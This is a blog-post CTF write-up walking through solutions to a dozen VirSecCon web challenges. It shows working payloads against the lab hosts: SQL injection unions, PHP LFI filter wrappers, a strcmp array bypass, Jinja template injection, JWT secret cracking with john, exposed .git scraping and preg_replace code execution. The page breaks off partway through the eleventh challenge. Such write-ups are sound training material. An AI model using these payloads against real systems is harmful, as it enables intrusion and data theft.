<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>VirSecCon CTF &#34;Web Challenges&#34; - gr4n173</title><meta name="Description" content="Here I will explain all the web challenges that I solved."><meta property="og:title" content="VirSecCon CTF &#34;Web Challenges&#34;" />
<meta property="og:description" content="Here I will explain all the web challenges that I solved." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.com/virsecctf_web/" />
<meta property="og:image" content="http://example.com/logo.png"/>
<meta property="article:published_time" content="2020-04-17T19:29:01+08:00" />
<meta property="article:modified_time" content="2020-04-17T08:45:01+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://example.com/logo.png"/>

<meta name="twitter:title" content="VirSecCon CTF &#34;Web Challenges&#34;"/>
<meta name="twitter:description" content="Here I will explain all the web challenges that I solved."/>
<meta name="application-name" content="gr4n173">
<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/virsecctf_web/" /><link rel="prev" href="http://example.com/virsecctf_scripting/" /><link rel="next" href="http://example.com/mango/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "VirSecCon CTF \"Web Challenges\"",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.com\/virsecctf_web\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "http:\/\/example.com\/images\/Apple-Devices-Preview.png",
                            "width":  3200 ,
                            "height":  2048 
                        }],"genre": "posts","keywords": "linux, virseccon, ctf, webchallenge, SSTI, PhpJuggler","wordcount":  1529 ,
        "url": "http:\/\/example.com\/virsecctf_web\/","datePublished": "2020-04-17T19:29:01+08:00","dateModified": "2020-04-17T08:45:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/example.com\/images\/profile.jpg",
                    "width":  400 ,
                    "height":  400 
                }},"author": {
                "@type": "Person",
                "name": "gr4n173"
            },"description": "Here I will explain all the web challenges that I solved."
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">VirSecCon CTF &#34;Web Challenges&#34;</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-04-17">2020-04-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1529 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#web-challenges">Web Challenges</a>
      <ul>
        <li><a href="#1-countdown">1. Countdown</a>
          <ul>
            <li><a href="#description-60">Description [60]</a></li>
          </ul>
        </li>
        <li><a href="#2-hot-access">2. Hot Access</a>
          <ul>
            <li><a href="#description-70">Description [70]</a></li>
          </ul>
        </li>
        <li><a href="#3-magician">3. Magician</a>
          <ul>
            <li><a href="#description-80">Description [80]</a></li>
          </ul>
        </li>
        <li><a href="#4-phpjuggler">4. PHPJuggler</a>
          <ul>
            <li><a href="#decription-80">Decription [80]</a></li>
          </ul>
        </li>
        <li><a href="#5-glhf">5. GLHF</a>
          <ul>
            <li><a href="#description-90">Description [90]</a></li>
          </ul>
        </li>
        <li><a href="#6-jawt">6. JaWT</a>
          <ul>
            <li><a href="#description-90-1">Description [90]</a></li>
          </ul>
        </li>
        <li><a href="#7-mask">7. Mask</a>
          <ul>
            <li><a href="#description-90-2">Description [90]</a></li>
          </ul>
        </li>
        <li><a href="#8-10-character-web-shell">8. 10 Character Web Shell</a>
          <ul>
            <li><a href="#description-100">Description [100]</a></li>
          </ul>
        </li>
        <li><a href="#9-sequelitis">9. Sequelitis</a>
          <ul>
            <li><a href="#description-100-1">Description [100]</a></li>
          </ul>
        </li>
        <li><a href="#10-dairy-products">10. Dairy Products</a>
          <ul>
            <li><a href="#description-100-2">Description [100]</a></li>
          </ul>
        </li>
        <li><a href="#11-irregular-expressions">11. Irregular Expressions</a>
          <ul>
            <li><a href="#description-100-3">Description [100]</a></li>
          </ul>
        </li>
        <li><a href="#12-get-encoded">12. GET Encoded</a>
          <ul>
            <li><a href="#description-125">Description [125]</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Here I will explain all the web challenges that I solved along with the tools used.</p>
<hr>
<h2 id="web-challenges">Web Challenges</h2>
<p>Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc..</p>
<h3 id="1-countdown">1. Countdown</h3>
<h4 id="description-60">Description [60]</h4>
<p>We hear something beeping&hellip; is there something in the oven?</p>
<p>Connect here: <a href="http://jh2i.com:50036">http://jh2i.com:50036</a>.</p>
<p><strong>Solution</strong>:- As I visited the site there was nothing in source-code except <code>defuse.php</code> so I fired my burp-suite and intercepted and got <code>detonate_time</code> cookie as<br>
<code>Cookie: detonate_time=1587109772 </code>
and changed it more than it was<br>
<code>Cookie: detonate_time=99999999999999999999999999</code>
this way I got the flag.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/countdown_flag_virseccon.jpg"
        data-srcset="/virsecctf_web/public/images/countdown_flag_virseccon.jpg, public/images/countdown_flag_virseccon.jpg 1.5x, /virsecctf_web/public/images/countdown_flag_virseccon.jpg 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/countdown_flag_virseccon.jpg"
        title="countdown_flag" /></p>
<h3 id="2-hot-access">2. Hot Access</h3>
<h4 id="description-70">Description [70]</h4>
<p>Access to all the latest modules, hot off the press! What can you access?</p>
<p>Connect here: <a href="http://jh2i.com:50016">http://jh2i.com:50016</a></p>
<p><strong>Solution</strong>:- As the challenge name was <code>hotaccess</code> and it was using a simple php module with resources from apache web server. So I checked the <code>date</code> and <code>time</code>  got the new paramter
<code>http://jh2i.com:50016/?m=modules/date.php</code></p>
<p>Now I accessed <code>.htaccess</code> as <code>?m=.htaccess</code> which was a default file created by apache in every webserver and got output.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/htaccess_virseccon.jpg"
        data-srcset="/virsecctf_web/public/images/htaccess_virseccon.jpg, public/images/htaccess_virseccon.jpg 1.5x, /virsecctf_web/public/images/htaccess_virseccon.jpg 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/htaccess_virseccon.jpg"
        title=".htaccess" /></p>
<p>On viewing-source code I got <code>sshh_don_tell_i_hid_the_flag_here</code> dir.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"> <span class="p">&lt;</span><span class="nt">Directory</span> <span class="err">/</span><span class="na">var</span><span class="err">/</span><span class="na">www</span><span class="err">/</span><span class="na">html</span><span class="err">/</span><span class="na">sshh_dont_tell_i_hid_the_flag_here</span><span class="p">&gt;</span>
	
	AllowOverride All
 
 <span class="p">&lt;/</span><span class="nt">Directory</span><span class="p">&gt;&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
	<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>and visited that dir as
<code>?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt</code>. Then I finally got the flag with 70 points.</p>
<blockquote>
<p><code>LLS{htaccess_can_control_what_you_access}</code></p>
</blockquote>
<h3 id="3-magician">3. Magician</h3>
<h4 id="description-80">Description [80]</h4>
<p>Show me a hat trick!</p>
<p>Connect here: <a href="http://jh2i.com:50000">http://jh2i.com:50000</a></p>
<p><strong>Solution</strong>:- Challenge presents a hash in home page <code>==0e953532678923638053842468642408</code>. So I tried with md5 decrypt but failed then I looked over the challenge name word &lsquo;Magic Hash&rsquo; and got this github repo which was quite interesting one.
<a href="https://github.com/spaze/hashes/blob/master/md5.md" target="_blank" rel="noopener noreffer">https://github.com/spaze/hashes/blob/master/md5.md</a></p>
<p>Entering any string of that hash I got the flag.</p>
<blockquote>
<p><code>LLS{magic_hashes_make_for_a_good_show} </code></p>
</blockquote>
<h3 id="4-phpjuggler">4. PHPJuggler</h3>
<h4 id="decription-80">Decription [80]</h4>
<p>PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!</p>
<p>Connect here: <a href="http://jh2i.com:50030">http://jh2i.com:50030</a>.</p>
<p><strong>Solution</strong>:- As I visited the site and found a php code which was working in backend.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
    
    include(&#39;flag.php&#39;);

    if ( isset($_POST[&#39;flag&#39;]) ){
        if ( strcmp( $_POST[&#39;flag&#39;], $flag ) == 0 ){
            echo(&#34;You got it! That&#39;s the correct flag! &lt;br&gt;&#34;);
            echo($flag);
        }else{
            echo(&#34;NOPE! Wrong flag.&#34;);
        }
        echo (&#34;&lt;br&gt;&lt;br&gt;&#34;);
    }

    highlight_file(__FILE__);   
?&gt;
</code></pre></td></tr></table>
</div>
</div><p>Here I found <code>strcmp()</code> function which compares the strings and that function willn&rsquo;t handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag .</p>
<p><code>flag=fsd</code> =&raquo; <code>flag[]=fsd</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
You got it! That&#39;s the correct flag!
LLS{php_dropped_the_ball_again}
</code></pre></td></tr></table>
</div>
</div><h3 id="5-glhf">5. GLHF</h3>
<h4 id="description-90">Description [90]</h4>
<p>LMFAO! FLAG PLZ, THX!</p>
<p>Connect here: <a href="http://jh2i.com:50014">http://jh2i.com:50014</a></p>
<p><strong>Solution</strong>:- After visiting the challenge I got many urls and I noticed <code>FLAG</code> and submit it as<br>
<code>/index.php?page=FLAG</code>
and got</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback"> FLAG????
WTF, PLZ??? 
</code></pre></td></tr></table>
</div>
</div><p>On viewing source I got</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">    &lt;!-- SRY PHP LFI NBD --&gt;
</code></pre></td></tr></table>
</div>
</div><p>So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the <code>php://filter/convert.base64-encode/resource=FLAG</code> as lfi injection point. You can visit here for more <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener noreffer">Juggling tricks</a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==
</code></pre></td></tr></table>
</div>
</div><p>I tried to decode this and got the flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">
root@gr4n173:~# echo &#34;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== &#34; | base64 -d  
&lt;?php
    /*
    // _______________________________________________________________

                        LLS{lmfao_php_filters_ftw}

    // _______________________________________________________________
    */
?&gt;
</code></pre></td></tr></table>
</div>
</div><h3 id="6-jawt">6. JaWT</h3>
<h4 id="description-90-1">Description [90]</h4>
<p>Check the admin&rsquo;s scratchpad!</p>
<p>Connect here: <a href="http://jh2i.com:50019/">http://jh2i.com:50019/</a></p>
<p><strong>Solution</strong>:-On visiting the site I was able to login in as any user except <code>admin</code> so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter <code>jwt</code>  <code>jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A</code></p>
<p>Header:-</p>
<blockquote>
<p>{
&ldquo;alg&rdquo;: &ldquo;HS256&rdquo;,
&ldquo;typ&rdquo;: &ldquo;JWT&rdquo;
}</p>
</blockquote>
<p>Payload:-</p>
<blockquote>
<p>{
&ldquo;user&rdquo;: &ldquo;user&rdquo;</p>
</blockquote>
<p>I found a superb website to edit jwt <a href="https://jwt.io/" target="_blank" rel="noopener noreffer">jwt.io</a>.</p>
<p>and now requied a secret key for that I used john to crack the jwt</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~#echo &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ&#34; &gt; jwt
root@gr4n173:~# john jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
fuckit           (?)
</code></pre></td></tr></table>
</div>
</div><p>I used that secret key and edited user <code>user</code> =&gt; <code>admin</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/jwt_token_virseccon.png"
        data-srcset="/virsecctf_web/public/images/jwt_token_virseccon.png, public/images/jwt_token_virseccon.png 1.5x, /virsecctf_web/public/images/jwt_token_virseccon.png 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/jwt_token_virseccon.png"
        title="jwt_token" /></p>
<p>and submited in burp-suite and finally got the flag.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/jwt_flag_virseccon.png"
        data-srcset="/virsecctf_web/public/images/jwt_flag_virseccon.png, public/images/jwt_flag_virseccon.png 1.5x, /virsecctf_web/public/images/jwt_flag_virseccon.png 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/jwt_flag_virseccon.png"
        title="jwt_flag" /></p>
<blockquote>
<p><code>LLS{jawt_was_just_what_you_thought}</code></p>
</blockquote>
<h3 id="7-mask">7. Mask</h3>
<h4 id="description-90-2">Description [90]</h4>
<p>Take off your mask.</p>
<p>Connect here: <a href="http://jh2i.com:50023">http://jh2i.com:50023</a>.</p>
<p><strong>Solution</strong>:-After visiting challenge website I got the Jinja =&gt; Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/payload_virseccon.jpg"
        data-srcset="/virsecctf_web/public/images/payload_virseccon.jpg, public/images/payload_virseccon.jpg 1.5x, /virsecctf_web/public/images/payload_virseccon.jpg 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/payload_virseccon.jpg"
        title="ssti" /></p>
<p>and I got the <code>4</code> as output so then checked for <code>config</code> files.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/config_virseccon.jpg"
        data-srcset="/virsecctf_web/public/images/config_virseccon.jpg, public/images/config_virseccon.jpg 1.5x, /virsecctf_web/public/images/config_virseccon.jpg 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/config_virseccon.jpg"
        title="config" /></p>
<p>And got the many configuration keys along with <code>secret key</code></p>
<blockquote>
<p>``&lsquo;SECRET_KEY&rsquo;: &lsquo;LLS{server_side_template_injection_unmasked}`</p>
</blockquote>
<p>This way I got the flag. If you like to read more about SSTI then you can visit <a href="https://owasp-skf.gitbook.io/asvs-write-ups/kbid-267-server-side-template-injection" target="_blank" rel="noopener noreffer">here</a>.</p>
<h3 id="8-10-character-web-shell">8. 10 Character Web Shell</h3>
<h4 id="description-100">Description [100]</h4>
<p>Only 10 char&ndash;</p>
<p>Connect here: <a href="http://jh2i.com:50001">http://jh2i.com:50001</a>.</p>
<p><strong>Solution</strong>:- After visiting the challenge I got a simple php backend code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php

    $c = $_GET[c];

    if(strlen($c) &lt; 10){
            echo shell_exec($c);
    }else{
            echo &#34;too long!&#34;;
    }
    highlight_file(__FILE__);
?&gt;
</code></pre></td></tr></table>
</div>
</div><p>and used paramter as <code>http://jh2i.com:50001/?c=cat flag*</code></p>
<blockquote>
<p><code>LLS{you_really_can_see_in_the_dark} </code></p>
</blockquote>
<p>This way I got the flag .</p>
<h3 id="9-sequelitis">9. Sequelitis</h3>
<h4 id="description-100-1">Description [100]</h4>
<p>Sequelitis has moved to a new database for keeping track of their customers. Break in.</p>
<p>Connect here: <a href="http://jh2i.com:50034">http://jh2i.com:50034</a>.</p>
<p><strong>Solution</strong>:- As the challenge name <code>Sequelitis</code> which indicate there was sqli. So at first I tried a simple payload <code>' or 1==1 --</code> didn&rsquo;t work and slightly changed to <code>'or 1==1 -- -</code> I got the output</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">Trey Maxam: 1010
Joe Benin: 2001
Grant Wyman: 1337
John Hammond: 1785
</code></pre></td></tr></table>
</div>
</div><p>So after alot of checking the table and columns my final payload to get flag was <code>' union select value,2,3  from flag -- -</code></p>
<blockquote>
<p><code>LLS{explicit_sqli_is_how_sql_will_die} 2: 3</code></p>
</blockquote>
<h3 id="10-dairy-products">10. Dairy Products</h3>
<h4 id="description-100-2">Description [100]</h4>
<p>There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product.</p>
<p>Connect here: http://142.93.3.19:50008</p>
<p><strong>Solution</strong>:- As soon as I visited the challenge got the hint as <code>git milk</code> and checked <code>.git</code> dir which gave me a git repo. Then I download to my localmachine .</p>
<blockquote>
<p>root@gr4n173:~# wget -r &ndash;no-parent http://142.93.3.19:50008/.git/</p>
</blockquote>
<p>after that downloaded I used the command as</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">root@gr4n173:~# git log | grep commit | awk &#39;{print $2}&#39; | while read line;do git show $line;done | grep -i &#34;{.*}&#34;
+LLS{you_gitm_gotm_good_partner}
+for i in {1..10}
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>git log =&gt;  It gives the commit history.</p>
</blockquote>
<blockquote>
<p>grep commit =&gt; It grep the commit only .</p>
</blockquote>
<blockquote>
<p>awk &lsquo;{print $2}&rsquo; =&gt; It just takes the commitsha.</p>
</blockquote>
<blockquote>
<p>while read line;do git show $line; =&gt; it makes a loop for every shacommit and show all the commit .</p>
</blockquote>
<blockquote>
<p>grep -i &ldquo;{.*}&rdquo; =&gt; It grep the flag.</p>
</blockquote>
<p>This way I solved the challenge and got 100 points.</p>
<h3 id="11-irregular-expressions">11. Irregular Expressions</h3>
<h4 id="description-100-3">Description [100]</h4>
<p>Check out our new regular expressions testbed! Now you can test your regex online at!</p>
<p>Connect here: <a href="http://jh2i.com:50018/">http://jh2i.com:50018/</a></p>
<p><strong>Solution</strong>:- After visiting the website and viewing the source code I got this.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;b&gt;Warning&lt;/b&gt;:  preg_replace(): Unknown modifier &#39;\&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;39&lt;/b&gt;&lt;br /&gt;
</code></pre></td></tr></table>
</div>
</div><p>as <a href="https://www.php.net/manual/en/function.preg-replace.php" target="_blank" rel="noopener noreffer">pre_replace()</a> there you can find <code>/e</code>modifier to run the eval() command so I used it</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/irregular_virseccon.png"
        data-srcset="/virsecctf_web/public/images/irregular_virseccon.png, public/images/irregular_virseccon.png 1.5x, /virsecctf_web/public/images/irregular_virseccon.png 2x"
        data-sizes="auto"
        alt="/virsecctf_web/public/images/irregular_virseccon.png"
        title="irregular_express" /></p>
<p>this way I can run the RCE so I used <code>system('ls -al');</code> to get the files.</p>
<div class="highlight"><div class="chroma">
